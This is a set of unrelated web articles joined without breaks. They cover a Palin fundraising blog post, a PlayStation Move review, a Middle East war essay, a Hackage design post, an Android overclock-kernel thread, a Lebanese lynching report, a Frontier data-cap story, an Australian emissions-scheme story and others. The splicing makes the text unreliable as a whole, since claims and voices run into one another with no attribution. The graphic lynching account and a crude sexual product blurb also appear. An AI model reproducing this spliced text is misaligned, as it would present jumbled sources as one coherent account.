The disclosure of the direct connection between C4P and Sarah Palin is highly embarrassing , because it is now more than obvious that the C4P " Webathon " for the Palin ’s " Alaska Fund Trust " was most likely not a grassroots effort , but a coordinated effort with Sarah Palin – who offically has nothing to do at all with her slush - fund called " Alaska Fund Trust " .
Despite strong suggestions that the Alaska Fund Trust ( Palin ’s legal defense fund ) may itself not be legal , and despite the fact that Palin is pulling in six - figures for speaking engagements , and is a best - selling author who could pay off her debt several times over , The Alaska Fund Trust continues to accept donations .
According to the ever watchful Palingates blog , Rebecca Mansour and Joseph Russo may be the FB ghostwriters -

I just played SOCOM 4 with the newly - named PlayStation Move controller .
And now I know how the PlayStation 3's motion - sensitive controller is not just a me - too Wii controller .
Advertisement
For those who need the basics , the PlayStation Move is a remote - like motion - sensitive controller with a sphere at the end .
The sub - controller is an off - hand controller being offered for some Move games .
The Move controller connects to the PS3 with the help of a PlayStation Eye camera , which detects the Move 's colored sphere , while tilt sensors in the move transmit their position data to the PS3 .
But at first glance , the whole thing seems like just another version of the Wii Remote and Nunchuk .
Advertisement
Not quite .
There are key differences :
- Fewer buttons : The Move controller is actually even more streamlined than the Wii Remote .
Nintendo's Remote still offers / confuses a new player with a d-pad , plus , A , minus , 1 and 2 buttons as well as a home button and B trigger .
The Move has its own home button and underbelly trigger , but just five other points of button input .
That makes the controller actually feel a little naked and therefore likely even less daunting to a new player — unless they need their controllers to look like TV remotes .
G/O Media may get a commission Subscribe and Get Your First Bag Free Promo Code AtlasCoffeeDay20
- No wasted batteries : The Wii remote sucks up AA battery juice .
The Move and its companion sub - controller are rechargeable via the same mini-USB connection used to charge the PS3's main controller .
- A smarter controller : I played SOCOM 4 , a third person - shooter , with the Move pointed at the TV like a gun and the sub - controller in my left hand to command character movement .
Wii games that were controlled with Remote and Nunchuk could be befuddled if the player pointed the Remote away from the screen .
If you were playing a shooter and aimed just off the screen , the game 's camera might start spinning or the game would pause and ask for the player to point at the TV again .
The combination of camera sensors — the Sony Eyetoy on top of the TV detects the presence of the Move — and a gyroscope prevented SOCOM 4 from getting confused .
When I moved my controller to point off of the TV , the gyroscopic sensors kept track of my movement .
The same thing happened when a SOCOM developer blocked the Eyetoy camera .
The precision of the controller diminishes in these situation .
but the PS3 does n't lose track of the device .
Advertisement
- No wire ! : The Wii Remote and Nunchuk are tethered by a short cable .
The PS3 Move and its subcontroller are not .
- No off - hand gyro : The Wii Nunchuk has a sensor that detects motion , more crudely than does the Remote .
The PS3's version of the Nunchuk , does not have a motion sensor , according to a developer I was speaking to .
There 's a chance that is not final , but that is the case with the controllers at Sony 's showcase event today .
But that 's why two - handed boxing - style games were shown with two Moves .
On the Wii , those kinds of games are handled , with supposedly less precision , with a Remote and Nunchuk .
Advertisement
- The colored ball :
The colorful sphere at the pointing end of the Move is the thing that the PlayStation Eye uses to detect the presence of the Move .
The color changes .
In the demo I played with SOCOM 4 , the sphere was orange .
Why ?
Because the software detected that there was no orange in the background .
If we had been in a different room , the color would be different .
The Wii's signature hue may be white , but this varying color at the end of the Move will likely prove to be the Move 's visual trademark .
- The Z : Without a Wii MotionPlus , the Wii Remote cannot accurately sense depth .
The Wii's sensor bar does n't know how close the player is standing to their TV , nor can it recognize movements toward or away from it .
The PS3 , however , can detect such movement in the Z - plane .
It does this thanks to the sphere at the end of the controller .
If the player moves the Move toward themselves , the PlayStation Eye camera sees the sphere shrink and therefore knows the controller has been moved in the Z - plane .
Clever .
[ UPDATE : Readers point out that a standard Wii Remote can sense some depth .
I have even played games — a long time ago — that ask for the Wii remote to be pulled in or out .
I never found that detection to be all that precise and believe the PS3 Move , based on how the tech was described to me , should be able to detect Z - plane movement more effectively , without needing to be pointed directly at the TV , as the Wii Remote must be . ]
Advertisement
Those are the differences , all less obvious than the similarities .
The PS3 Move is being shown to support shooters and table tennis , fistfighting and co-op platforming .
These may be familiar templates to Wii gamers who have sampled Metroid , Wii Sports , and Super Mario Galaxy .
But at the nitty - gritty level , some of the PS3 Move 's difference offer some nice feature improvements — maybe a drawback or two — and something that is n't quite the Wii - too it appears to be at first glance .
And , hey , the Sony person showing me SOCOM did n't even make me wear the controller 's wrist strap .
A Nintendo person would never let me get away with that .

The Move is out this fall , price and launch games to be revealed .
Rumblings of new war in the Middle East
20 April 2010
Recent days have seen a spate of developments that point to the danger of a new military conflagration in the Middle East .
Israel has warned Syria that it will face an Israeli attack if Hezbollah , the Shiite - based Lebanese militia , fires Scud missiles at Israel , the London Times reported Sunday .
The newspaper cites an unnamed Israeli cabinet minister as saying , “ We ’ll return Syria to the Stone Age by crippling its power stations , ports , fuel storage and every bit of strategic infrastructure if Hezbollah dare to launch ballistic missiles against us ” .
Israel has accused Syria of supplying Hezbollah with medium - range Russian - made Scud missiles .
Damascus has vigorously denied the charge , accusing Israel ’s hard - line government of using the Scud missile claim as a pretext for military action .
The Times article closely followed press reports that the Jordanian king , Abdullah II , had warned US congressional leaders in a closed - door meeting last Thursday that a Middle East war is imminent .
While Abdullah may have been the first Arab head of state to bring such warnings to Washington , there have been rumors and rumblings of a new Israeli war for months .
Despite destroying the infrastructure of the southern half of Lebanon in 2006 , killing more than a thousand civilians , Israel ’s month - long invasion failed in achieving its key objective — the destruction of Hezbollah as a serious military force .
Israel ’s anxiety and belligerence have been intensified by Washington ’s failure to limit and roll back Iran ’s growing influence in the region .
In response to the American government ’s decades - long campaign to subvert and overthrow the Islamic Republic , Tehran has developed extensive ties to the Syrian regime and provides critical political and material support to Hezbollah and Hamas .
Senior figures in the Obama administration and Pentagon have responded to a New York Times report on a secret January memo from Defense Secretary Robert Gates by insisting that Washington is actively considering a full range of actions against Iran , including war .
According to the Times , Gates ’s secret three - page memo warned that the administration did n’t have a long - term policy to deal with Iran in the event that Tehran continues to defy the US demand that it forego its rights under the Nuclear Non-Proliferation Treaty to a full - cycle civilian nuclear energy program .
“ The fact ” , said Obama ’s National Security Advisor General James Jones , “ that we do n’t announce publicly our entire strategy for the world to see does n’t mean we do n’t have a strategy that anticipates the full range of contingencies — we do ” .
Gates and the White House have downplayed the significance of the January memo — the defense secretary claims that the Times misconstrued “ its purpose and content ” — and have denied the suggestion that the Obama administration is , or has been divided , over its Iran policy .
But there has been no denial of the Times ’ contention that Gates ’ memo was part of “ an intensifying effort inside the Pentagon , the White House and the intelligence agencies to develop new options ” , including “ a set of military alternatives … should diplomacy and sanctions fail to force Iran ” to heel .
The Times report indicates that the Obama administration has accepted one of the key points Gates is said to have argued in his memo : the need for Washington to establish a bar or trigger for military action against Iran well short of Tehran actually developing a nuclear weapon .
It cites a “ senior administration official ” as saying that the US would “ ensure that Iran would not ‘ acquire a nuclear capability ’ ” .
Speaking at Columbia University Sunday , the chairman of the US joint chiefs of staff , Admiral Mike Mullen , declared that the Pentagon was continuously planning for a military strike against Iran and stands ready to strike if that is the president ’s “ call ” .
But he warned , “ striking ” can “ generate unintended consequences that are difficult to predict ” .
Later Mullen added , “ If there was an easy answer , we would ’ve picked it off the shelf ” .
Mullen ’s remarks speak to the strategic dilemma facing US imperialism .
Washington views the current Iranian regime as an intolerable obstacle to its strategic dominance of the Middle East , its drive to gain access to and control over oil - rich Central Asia , and its plans to strengthen its world position by shaping global energy flows .
During the past decade , Washington has ratcheted up its pressure against Iran — through the invasions and occupations of the neighboring states of Iraq and Afghanistan , through a program of economic sanctions , and by lending support to opposition groups , from Balochi nationalist terrorists to the bourgeois opposition Green movement .
In the final years of the Bush administration , the US political and military - security establishment engaged in an acrimonious debate as to whether to attack Iran .
What has thus far stayed the hand of the Obama administration — which has continued the war in Iraq , dramatically expanded the “ AfPak ” War , and in its recent nuclear weapons strategy statement refused to exclude using nuclear weapons against a non-nuclear Iran — is the recognition that there can be no successful “ surgical strike ” against Iran .
The Iranian regime — given the country ’s size , strategic location , and its international allies — has the potential to seriously damage the US and its client regimes and disrupt Persian Gulf oil exports , thereby delivering a body blow to the world economy .
Virtually nothing is said of this publicly .
But the strategists of US imperialism recognize a war with Iran could ignite a military - political firestorm that would engulf the entire region , from Afghanistan and Iraq to Israel - Palestine — a conflict that in its size and scope could be the largest since at least the Korean War .
To limit this potential , a US strike against Iran would from the outset have to take the form of a “ shock and awe ” campaign aiming at destroying Iran ’s infrastructure and ability to function as a modern state .
Washington ’s launch of such a war would invariably have an explosive impact on world geopolitics , on the relations of the US with all the other great powers , and on class relations in the US .
Russia and China , in particular , would in all likelihood see such a war , directed as it would be in ensuring US control over the world ’s principal oil - exporting region and projecting US power into Eurasia , as constituting a fundamental threat to their strategic interests .
By the same token , however , the US cannot retreat from the drive to assert its domination over the Middle East .
If this was imperative in the decades after World War II when the position of American capitalism was unchallenged , it is all the more so now that its world position has been so demonstrably undermined .
Thus the White House and Pentagon continue to prepare for “ all contingencies ” and invoke these war plans to strong - arm the other great powers into supporting yet another round of punishing sanctions against Tehran .
Whatever its particular form , a new Middle East war would have catastrophic consequences for the people of the Middle East — Iranian , Arab , and Jewish — and potentially the world .

Enforcing Stability in Hackage – Some Thoughts
Some time ago , I wrote a post here about the relationship between Hackage and the Haskell Platform .
By key point was this :
Hackage is not a mechanism for enforcing stability ; it ’s good that anyone , no matter what they write , can upload it to Hackage .
If we try to do quality control as a prerequisite to Hackage , then the only consequence will be fewer packages in Hackage .
That ’s still true .
The recent dicussion here made me think , though .
Is there a proper role for quality control in Hackage ?
I think there might be .
I ’ll start with some basic rules :
Nothing in such a system should make it harder to upload a package to Hackage .
This includes asking package developers to commit to future maintenance .
It would n’t be worth the loss of a convenient way to install packages … even packages that do n’t work at all , and for which the author is merely sharing a partial proof of concept .
The system should avoid assigning personal responsibility unless necessary .
This means that if someone goes away , the system should still work as well as it can , modulo that the one person is n’t contributing .
If the community as a whole is waiting on someone specific to get around to something , the system is broken .
Such a system would have to be symbiotic with the Haskell Platform .
The Haskell Platform is working , and a great direction to follow for the future of Haskell .
Hackage should n’t be competing against the platform in any way .
This is to me the least justifiable of any ground rule …
I ’m generally not a believer in being so scared of duplication that we do n’t try new things … but when it comes to quality assurance , I think a different dynamic is in play versus software development .
Quality assurance really is a bit of a chore , a lot less personal , and it ’s fair to at least work at not wasting anyone ’s time .
If something could be designed according to these ground rules , it could be a positive direction for Haskell to go .
I see several parts to the effort :
Part 1 : Quality of Individual Packages
A lot of thought has already gone into this piece of the equation .
Everyone is looking forward to the day when we have Hackage 2.0 , which new social networky features .
Here ’s a few of the ideas .
Community rating of software .
This is the obvious thing to add , but it also may turn out to be the most difficult , by far , to get right !
Everyone wants to do a nice rating system to harness popular opinion and all that … but systems that work tend to be the result of years and years of tweaking by dedicated people who are willing to track down the answers to questions like “ why is this recommending X over Y ? ”
We ’re going to have to ask ourselves some difficult questions .
Is the quality of a Haskell package something that can just be measured on a linear scale ?
Or does it depend on what packages you ’re using it with ?
Does it depend on your API preferences ?
Or can we say that some APIs are just better than others ?
Then we ’re going to have to ask the hardest question : how do we get people to really rate the software on quality and stability , not level of excitement ?
There are a lot of exciting Haskell projects out there , which are simply bad ideas to depend on in a stable piece of software !
In the Haskell community as it exists today , I suspect many of them would end up rated quite highly .
Unfortunately , social ranking systems are very frequently about level of interest rather than level of usefulness .
The front page of Reddit is not a source of useful , practical information .
So all in all , there are going to be a few long , hard years of asking ourselves hard questions , both about the best mathematical model to compile all of this data , and also about the social engineering needed to increase the signal to noise ratio of the rating system .
I ’ll offer this one suggestion now : let ’s allow users to rank projects on several axes : ( a ) whether the quality is good and the interface is stable and usable , and ( b ) how “ awesome ” the project is .
Ask the question about awesomeness first , so we get that out of the way , since that ’s the place people will be more eager to give their input .
Then ask about the quality .
User -visible statistics .
Adding to this subjective judgement , it would be nice to see some hard data .
A number of data points would be useful in making the decision to use a package .
How many people have this package installed ?
Not the greatest question to ask , but an easy one !
This is subject to all the same concerns as the community rating idea , though .
Packages might be widely installed for a lot of reasons : among them , that the package is useful , and also that the package seemed like a really cool thing to check out .
How many packages depend on this one ?
How widely used are they ?
Definitely a much better question .
However , it ’s biased in its own way .
Some packages just are n’t meant to be used by other libraries , while others are entirely meant for that purpose .
How frequently are there build failures in this package ?
In packages that depend on this one ?
In packages this one depends on ?
This could be a very interesting source of information .
How quickly is the public interface for this package changing ?
This is a different question from the subjective idea of package stability that Hackage already reports from the package author .
Of course , it requires a distance function on public APIs of packages .
User reviews , comments , discussions .
As a Sourceforge - esque feature to help Haskell package developers , this would be great !
It would be especially great if , instead of two thousand isolated discussion forums , this functioned in some way as a Hackage - wide discussion forum , and certain projects and / or users could tap in by defining filters on tags , keywords , etc. for the discussions interesting to them .
Of course , an obvious way to see discussion forums about packages would also have some consequences for quality assurance .
Together , these techniques could hopefully make a lot of progress on the problem of staring at the five packages for doing linear algebra in Haskell and wondering exactly how they differ from each other , and which one you should use .
That ’s a nice problem to solve .
It can even be done without a huge risk of violating any of the ground rules mentioned above .
All of the ideas mentioned above are done by others besides the package author , we ’re never waiting on anyone , and it ’s solving a problem that ’s a bit removed from the Haskell Platform ( though certainly quality decisions that go into the Haskell Platform could be influenced by the statistics and input provided here ) .
The fact is , though , in the whole quality assurance pictures , it ’s the easy problem !
Part 2 : The Integration / Stability Picture
The far more difficult problem is integration of packages and maintaining a stable collection of functioning packages .
Given that packages A , B , and C work independently , how can we be sure that they work together nicely ?
That they do n’t have incompatible version dependencies ?
Or different and conflicting assumptions ?
Or that their interfaces are n’t so wildly conflicting that it ’s awkward to use them both at once ?
It is certainly tempting to back off here , and just say that the Haskell Platform will fix this .
( No offense to Don … I agree with most of what he ’s saying in that link ) I think that may be a mistake , however .
The Haskell Platform encompasses a few dozen packages .
Granted , that may increase over time , but : ( a ) are n’t there certain kinds of packages that wo n’t and should n’t ever become a part of the Haskell Platform ?
Do they not need integration testing ?
Really ?
Also , ( b ) what about the problem of whether the Haskell Platform ’s processes scale to a large number of packages ?
I ’d argue that it might help to think , in general , about the problem of collections of Haskell packages that are independently developed , but for which there ’s a community of people that want to use them together .
Then the Haskell Platform becomes the limiting case where that community of people is the entire Haskell community .
There may , though , be smaller such communities .
Okay , you ’re being quite fair to ask for an example here .
The Happstack community looks like a strong candidate .
Happstack itself is written as a collection of loosely coupled packages , such as happstack - server , and happstack - state .
There ’s talk of adding more on top of this : modules to handle authentication , and sessions .
Happstack also includes dependencies on other modules … some of which often break with respect to each other ( generally a matter of version dependency situations that Cabal ca n’t or wo n’t resolve ) .
Even more to the point , look at web development in many other languages , and you ’ll notice that there are even larger collections of various frameworks and libraries available , and that very few languages handle the testing of all of those web development tools and libraries as a part of the standard library for the language .
I think we should be posing and discussing these questions .
How much of what the Haskell platform does is specific to it being the Haskell Platform ?
How much of it could apply to any collection of packages that are developed independently , but have a community of people that want to use them together ?
What features for Hackage might be requested by the Haskell Platform ?
Can they be generalized to various different communities or package collections ?
A proposal might look something like this : in addition to packages , Hackage could track aggregates , which just have a name , description , version , and a collection of other tools and libraries ( or other aggregates ? ) of specific version numbers .
Perhaps , as in the case of the Haskell Platform , library authors would need to propose their packages to various aggregates ….
perhaps one could let the aggregate owner decide that kind of policy .
Many of the part 1 features might be applied here as well .
Or that might be complete bunk , and useless .
The point is , perhaps we need to be thinking about how specific subcommunities could do something like the Haskell Platform at the subcommunity level .
And that seems like a place where a unified set of tools in Hackage could be a very good thing .
Conclusion
In essence , I think we ’re moving the right direction here .
The answers people are giving are good ones : that Hackage is going to develop some more social moderation features , but that the Haskell Platform is ultimately the answer to stability .
But maybe we ought to be asking , not if Hackage should enforce stability or integration , but rather if it should provide more of the tools for more groups to do so .
Devs working on overclock kernels .
If you want your overclock kernel in OP ( here ) send me a PM and I 'll consider linking to it .
Video proof of 614 MHz : http://www.youtube.com/watch?v=9Oaesb0OX8k
A ) How do I try this without flashing this to my phone ?
Code : fastboot boot boot.img
B ) Ramhack ?
C ) What phones does this work on ?
D ) What are some prerequisites I need to flash this ?
E ) My wifi does n't work after I flashed x.img file !
F ) Is this stable ?
when I try to just plug in my usb cable
This thread is about a new overclock kernel patch for the MSM7K , which includes the G1 and Magic .
For devs , the original patch is here
There 's also an autodetection patch for SetCPU by coolbho3000 himself here pershoot 's github for the lazy :
http://github.com/pershoot/ds-kernel
These kernels are not officially endorsed by Cyanogen for his ROM , so use at your own risk and do not file any bug reports to the ROM owners .
pershoot has done some good things to this for Cyanogenmod including some extra frequencies to choose from .
EBI0 version = 32B Magic or G1 on 1.x or 2.x radioEBI1 version = 32A Magic or G1 on 3.x radioHas lots of tweaks and goes up to 576 MHzThis works .
Read the thread .
If you want to try this without flashing your phone , download the zip file for your phone .
First turn OFF wifi .
Then turn your phone off .
Now go into fastboot .
Extract boot.img , probably in the same folder as your fastboot application .
Then use : ( replace boot.img with the name of the img file ) This will make the kernel run temporarily on your phone up till your phone is restarted again .
Do NOT turn your wifi on at this time , because it will freeze your phone .
If you want to keep it , flash the whole zip file from recovery .
Otherwise just restart your phone and you will be back to whatever you had before .
What is known as the ramhack is done by modifying the kernel source code with a patch and making a new kernel to flash .
Hence you see a boot.img in the zip files you flash .
This overclock kernel patch modifies the source code of the kernel .
If you want both ramhack together with the overclock , you need a kernel that contains both the ramhack AND the overclock patch .
If not explicitly stated , you can assume that the overclock patched kernel does not contain the ramhack patch and thereby does not have ramhack .
All HTC Dream / G1 and myTouch / Magic , not including Fender or 1.2 editions of the Magic for the precompiled kernels in this thread .
If you are applying the patch yourself it should work on any MSM7K device .
Custom recovery compatible with test keys , or root with working adb / fastboot .
And you need a compatible phone ( see C ) YOU MUST FLASH THE CORRESPONDING WIFI MODULE WHENEVER YOU FLASH THE KERNEL .
The .img file contains the kernel , which requires a patching wifi module to be recompiled ( wlan.ko located in your system volume ) with that kernel .
If wlan . ko was not provided , wifi will simply not work .
Ask whoever compiled that kernel to provide a wlan .
ko file for you to flash .
Stability seems to vary , but at the moment I do not recommend using 614 MHz for day - to - day use .
This kernel does not even run stable at 614 MHz right now for me , or at least .
Not sure what can be done there .
I threw in the 653 MHz EBI1 kernel that would n't boot for me for kicks .
My gut feeling of being unable to boot at 653 MHz and being unstable at even 614 Mhz leads me to think that the G1 is a pretty hopeless overclock .
The 32B Magic might have better luck .
CDMA
Heros are getting up to 700 MHz easily on the other forum .
It is not surprising that HTC designed the phones to have higher clock tolerances than the G1 designed to run at 384 MHz .
For all MSM7K devices including the Hero , Dream , Magicphhusson for sharingToAsTcfh for coming up with itCyanogen because it's his kernel sourcebenbuchacher for Super Dfarmatito for EBI0 compilecoolbho3000 for SetCPUpershoot for some great compiled kernelsI am not a dev !
This patch performs more changes the kernels source in acpuclock.c and involves the software modification of the way PLL is handled to allow for the overclock .
It is different than the previous OC patch that only modified the frequency table .
This patch adjusts the 528 MHz clock to 711 MHz , and can be modified by changing the patch file .
Acceptable clocks are multipliers of TXCO ( 19.2MHz ) .710.4 MHz = 19.2 * 37 Should work on 2.6.27 and 2.6.29 , and maybe more .
Some devs have already added this to their CDMA Hero ROMs with reports of success .

Youth television and radio channel BNN has declared 15 March ‘ National Whore ’s Day ’ .
They surely mean well and believe sex workers should be given a bouquet of roses as a token of appreciation for their hard work .
It already sounds too much like North America ’s ‘ Secretary ’s Day ’ now known as the more politically correct ‘ Administrative Professionals Day ’ .
There ’s also Mother ’s Day that made it over to the Netherlands and again involves giving flowers .
I see a pattern here .
According to estimates , since actual numbers are hard to come by , some 0.6 % of Dutch women between the ages of 15 and 46 can be classified as sex workers , including someone with a sugar daddy , a rich man who gives out money or expensive gifts to poorer , younger women in return sexual favours .
( Yup , you ’re a whore too , girlfriend ) .
Also according to this article , some 300,000 Dutch men frequent whores a few times a year .
“ Let us hope that clients [ men ] have time today [ 15 March ] to bring the working girls some flowers .
They should also buy flowers for their partners while they are at it , since surveys show that 70 to 80 % of pro’s clients have partners .

Angry mob of Lebanese villagers lynch murder suspect in town centre in gruesome vigilante attack
A mob of angry Lebanese villagers stabbed to death an Egyptian man and then lynched his naked body in the centre of town over allegations he killed four members of a local family .
Mohammed Msallem , a 38 - year - old Egyptian who worked as a butcher in Ketermaya , had been arrested a day earlier on suspicion of shooting to death an elderly couple and their two young granddaughters , aged seven and nine .
He was leading police investigators through a re-enactment of the killings when dozens of residents attacked him with sticks and knives , security officials said .
Police rushed Msallem to the intensive care unit of a nearby hospital , but residents broke in , dragged him out and pounded him with sticks .
Vigilante attack : Hundreds of Lebanese villagers gather around the hanging body of Egyptian Mohammed Msallem after he was stabbed to death and paraded through town
A security official said police at the scene could not stop the attackers , who blocked streets in the village to prevent police reinforcements from reaching the scene .
After killing Msallem , the attackers stripped his bloody body down to the victim 's underwear and drove it through town on a car hood , with several local men standing on the hood cheering .
They then hanged the body from a pole in the centre of town as hundreds of residents cried ' Allahu Akbar , ' or God is great .
Some villagers even took photos of the dead man with their mobile phones .
Shocking : Lebanese women take pictures of the dead murder suspect with their mobile phones
Looking on :
The villagers attacked Msallem after he was arrested on suspicion of murdering two girls and their grandparents
His body hung from the pole for about ten minutes before Lebanese army troops took him down and drove him away in a jeep .
The rare mob attack shocked many , and security officials said police who were escorting the man at the time were unable to prevent the killing in the Chouf mountain town of Ketermaya .
Interior Minister Ziad Baroud ordered an investigation and said such vigilante justice was ' extremely dangerous ' .
Exit : A Lebanese soldier removes the body from the scene and takes it away in an army truck
Security officials said Msallem had confessed to killing the four family members , but the motive was not immediately clear .
One official said Ketermaya residents also believed Msallem had raped a 15 - year - old local girl a month earlier , but that report could not be independently confirmed .
There was no immediate word of arrests in the attack .
Crime has been on the rise in Lebanon but such vigilante mob killings have been rare since the end of the 1975 - 90 civil war , during which political violence was common .
There 's yet another uproar over an ISP imposing Internet data caps on its customers and charging users who exceed them several hundred dollars a month .
This time around , the service in question is n't Time Warner Cable — it 's Minnesota - based telco Frontier Communications .
Frontier is n't the biggest player on the block , but its network includes 2.8 million voice / broadband connections , the company generated $ 2.2 billion in revenue in 2008 — and if you 're a rural Verizon customer , Frontier could soon be your ISP .
Disclosure of Frontier 's new pricing schedule comes from the outraged pages of stopthecap.com .
" Sources tell Stop the Cap !
the Internet Overcharging scheme Frontier is running is an experiment to gauge customer reaction , " the group 's latest blog post discloses .
" If the furious customer e-mail reaching us is any indication , it 's another public relations disaster for Frontier Communications .
One customer did n't even realize there was a 5 GB usage allowance to begin with , much less a vastly higher new monthly price if he wants to stay with Frontier DSL .
He 's not . "
The " vastly higher " monthly prices are indeed way up there , as indicated by the customer notification letters that Stop the Cap ! obtained and published .
" Dear [ Customer ] : Frontier is focused on providing the best possible internet experience across our entire customer base .
We bring you a quality service at a fair price , dependent upon an average monthly bandwidth usage of 5GB .
Over the past months , your account is in violation of our Residential Internet Acceptable Use Policy .
Our policy states that Frontier reserves the right to suspend , terminate or apply additional charges to the Service if such usage exceeds a reasonable amount of usage .
A reasonable amount of usage is defined as 5GB combined upload and download consumption during the course of a 30 - day billing period .
We realize there are times when our customers use the internet for services such as video and music downloads , however your specific usage has consistently exceeded 100 GB over a 30 day period .
We would like to provide you with the option of keeping your Frontier internet service at a monthly rate of $ 99.99 which is reflective of your average monthly usage . "
A similarly worded letter goes out to naughty subscribers who have been identified as consuming 250 GB over a 30 - day period .
They 're invited to stay with Frontier at the " reflective " rate of $ 249.99 a month .
Did we mention that all of this hubbub is about a DSL connection that is " up to " 3 M bps ?
And that basic plans for this anemic connection start at $ 49.99 / month ?
In major use
We 're going to go out on a limb and call these rates expensive .
After all , before withdrawing its plan , TWC caused something close to a national broadband riot by proposing an experimental pricing scheme for its 100 GB / month tier at $ 75 per month .
Frontier 's version is $ 24.99 higher for the same data level .
So we called Frontier and got the telco 's Steve Crosby , Senior Vice President of Communications , who surprised us by disclosing that these missives are going out to Frontier customers in only one location .
" We 're sending these letters out to a handful of subscribers in Mound , Minnesota , " Crosby said .
" They 're in major use of the network . "
We had to ask Crosby to repeat the name of that town several times just to make sure we got it right , but yes Virginia , there is a Mound , Minnesota .
Located on the western fringe of the Twin Cities , it has 9,435 residents , all of them surrounded by Lake Minnetonka .
" The city for all seasons , " Mound 's website proclaims .
Mound 's biggest claim to fame is that it is the birthplace of the Tonka Truck toy — named , of course , after the aforementioned body of water .
We asked Frontier what the broadband subscribers of Mound did to deserve this policy .
They were " very simply , excessive residential users , " Crosby explained .
How excessive , we pressed .
" Hundreds of gigabytes , " he responded .
A month ?
A week ?
we wondered .
" I do n't have that in front of me right now , " he replied .
What are they doing with this excess use ?
" We 're not detectives , " Crosby responded .
" We just know that there 's been an excessive amount of usage . "
" When you said , ' a handful , ' is that literally true ? " we pressed .
" Something like from one to five people ? "
Crosby paused .
" Under 100 , " he replied .
Will Frontier be developing a system to let the residents of Mound know when they 've approached 100 GB or 250GB ?
" We 're evaluating that currently , " he disclosed .
" Education of a customer is an important thing .
So we 're looking at ways of educating our customers as to their usage . "
And this bandwidth pricing system is really , truly , honest - to - Minnetonka just for Mound ?
Frontier is not planning on expanding it elsewhere ?
" Currently we have no intention of expanding it beyond that , " Crosby pledged .
Pure rural
But it 's the appearance of the word " currently " that worries us , because Frontier wants to expand its services well beyond The Land of 10,000 Lakes .
The company 's big plan is to acquire $ 8.6 billion worth of assets from Verizon in Arizona , California , Idaho , Illinois , Indiana , Michigan , Nevada , North Carolina , Ohio , Oregon , South Carolina , Washington , Wisconsin , and West Virginia .
Once state governments and the Federal Communications Commission have approved these purchases , Frontier will own 4.8 million more access lines , with a million high speed Internet customers and 69,000 FiOS video subscribers .
Total voice and broadband connections added : 5.8 million .
These acquisitions , Frontier promises , will create the nation 's " largest pure rural communications services provider " and the fifth largest incumbent local exchange carrier ( ILEC ) .
The expanded entity will have seven million access lines , 8.6 million voice and broadband connections , 1.6 million broadband subscribers , and about 350,000 satellite and FiOS video buyers .
Plus a few subscribers in Mound , Minnesota , stuck paying $ 100 a month ... for slow DSL .
At least so far .
It was once a centrepiece of the Federal Government 's election strategy , but now the emissions trading scheme ( ETS ) has been relegated to the shelf until at least 2013 .
Delaying the scheme means the Government could save $ 2.5 billion from its budget over the next three years , because it would not be paying compensation to households and industries .
Prime Minister Kevin Rudd recently said climate change remained a fundamental economic , environmental and moral challenge , whether it was popular or not .
But Government sources say it was decided last week to remove the scheme from next month 's budget , bowing to the political reality that the Senate is unlikely to pass the ETS any time soon .
The Upper House has already blocked the ETS legislation twice .
The bills are before the Parliament again but the Senate has delayed the debate while it examines the deal that Mr Rudd struck with former Opposition leader Malcolm Turnbull .
The bottom line is that neither the Opposition , now led by Tony Abbott , nor the Greens like the amended legislation , so it remains in limbo .
Greens leader Bob Brown says Mr Rudd has caved in to Mr Abbott 's attack on the ETS .
" If it is true , it is quite irresponsible because it signifies a climate change collapse by the Government in the face of the right - wing criticism from the Opposition and others that it is a great big tax , " he said .
Mr Brown says the Government could do a deal with the Greens , but lacks the political will to do so .
" Climate change is real .
It is stalking Australia .
It is threatening the Great Barrier Reef .
It is threatening the Murray - Darling Basin , " he said .
" We have seen projections of up to 90 per cent loss of productivity of the Murray - Darling Basin this century if climate change is n't tackled .
" It is up to the Australian Government to be responsibly taking the action now ... beginning with this budget . "
Climate ' inconvenience '
The Opposition 's climate action spokesman , Greg Hunt , says he is sceptical about the Government 's agenda .
" It is a pea and thimble game because what is absolutely clear is that last year 's greatest moral challenge has become this year 's inconvenience , " he said .
" The Government is concerned about the financial impacts of their enormous impost on electricity and grocery prices and the Government is concerned about its impact on the budget . "
Mr Hunt says the Government may have realised that the Senate is not going to agree to the ETS any time soon .
Resources Minister Martin Ferguson has told Radio National it is clear there is not enough support to pass the legislation .
" I think it 's very clear that we do n't have much hope of getting the legislation through the Senate , " he said .
" We 're disappointed and I 'm sure the broader community is disappointed . "
The Prime Minister 's office is refusing to comment .
A spokeswoman for Climate Change Minister Penny Wong says the Government remains committed to the scheme as the best and cheapest way of reducing carbon pollution .
Climate concerns
The decision to shelve the ETS comes as a new survey shows climate change could be a deciding factor in the next federal election .
The poll , conducted by Auspoll on behalf of the Climate Institute , Conservation Foundation and other groups , shows climate change is still of great concern to two - thirds of Australians .
The chief executive of the Climate Institute , John Connor , says 35 per cent of voters are more likely to vote for the Rudd Government if it takes stronger action on climate change and only 16 per cent are less likely .
" About two - thirds of Australians are concerned over climate change , " he said .
" We 've had a lot of muck - raking and misleading advertising campaigns from big polluters but concern is still strong .
" We think that the parties that take stronger action on climate change will be rewarded at the next poll . "
And Mr Connor says delaying the ETS is economically reckless .
" It 's not government for the good of Australia , or the good of humanity .
We are still emerging from delicate global talks , " he said .
" We actually think there 's been better momentum , but Australia taking an act like this really throws us back five years . "
Thanks to porn and articles like the Throat Swab , there are women out there who feel incapable , inadequate , useless really .
Sadly for these women , deep - throating proves to be too difficult for their little mouths and overly sensitive gag reflexes .
Our heart goes out to them .
Like any good humanitarians our first thought was , how can we help the poor , the downtrodden , the face - fuckless womenof our society build up their cock slurping self esteem ?
We searched high and low , but the answer was found at Amazon.com .
Comfortably Numb touts itself as a deep - throat spray that works as a numbing agent for the back of the throat .
“… helping to suppress gag reflex and prevent discomfort during oral sex .
Discreet enough to take with you wherever you go , this special spritz doubles as a breath freshener as well . ”
Because you never know when that need to Throat Swab will overtake her .
This way nobody has to wait until they ’re behind closed doors or out of Grandma ’s funeral .
Personally we think this would be a great stocking stuffer or Valentines gift for that special lady in your life .
If we ’d only known before we would have hid it at the end of our Easter Egg hunt .
We ’re sure she would have appreciated it .
Not only do they have Spearmint but Comfortably Numb also comes in Mint Chocolate flavor .
And everyone knows women love chocolate .
Note : Trying it reminded us of Chloroseptic Spray .
It numbs your throat , but feels , for lack of a better word , icky .
Not the least bizarre of the Government 's strategies , however , is Decc 's new Carbon Reduction Commitment ( CRC ) scheme , requiring up to 30,000 of our largest energy users , such as ministries , councils , universities , hospitals , supermarket chains ( and even " monasteries and nunneries " ) , to pay to register with the Environment Agency .
